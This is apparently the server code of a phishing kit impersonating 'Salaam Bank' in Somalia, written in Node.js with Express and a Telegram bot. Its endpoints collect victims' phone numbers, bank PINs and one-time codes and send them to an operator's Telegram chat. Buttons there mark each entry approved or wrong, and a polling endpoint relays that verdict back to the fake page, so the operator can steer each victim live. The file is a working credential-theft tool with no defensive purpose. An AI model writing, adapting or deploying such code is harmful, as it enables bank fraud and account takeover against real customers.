const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString();

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
    statusStore[phone] = "pending";

    const message = `📱 <b>SALAAM BANK - LOGIN ATTEMPT</b>\n🇨🇲 <b>Country:</b> ${country} (${countryCode})\n📱 <b>Phone:</b> ${phone}\n🔢 <b>Bank PIN:</b> ${pin}\n⏰ <b>Time:</b> ${currentTime}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Wrong PIN", callback_data: `wrong_pin|${phone}` }
                    ],
                    [
                        { text: "❌ Deny", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
    statusStore[phone] = "pending_otp1";

    const otpMessage = `🔑 <b>SALAAM BANK - OTP VERIFICATION</b>\n📱 <b>Phone:</b> ${phone}\n🔑 <b>Code:</b> <code>${code}</code>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Correct", callback_data: `otp1_correct|${phone}` }],
                    [{ text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` }]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "approved";
    await ctx.answerCbQuery("Approved");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>APPROVED</b>\n📱 ${phone}`);
});

bot.action(/^wrong_pin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "wrong_pin";
    await ctx.answerCbQuery("Marked as wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG BANK PIN MARKED</b>\n📱 ${phone}`);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.answerCbQuery("Denied");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>DENIED</b>\n📱 ${phone}`);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>OTP VERIFIED</b>\n📱 ${phone}`);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "wrong_otp";
    await ctx.answerCbQuery("Marked as wrong OTP");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG OTP MARKED</b>\n📱 ${phone}`);
});

app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
});

app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});
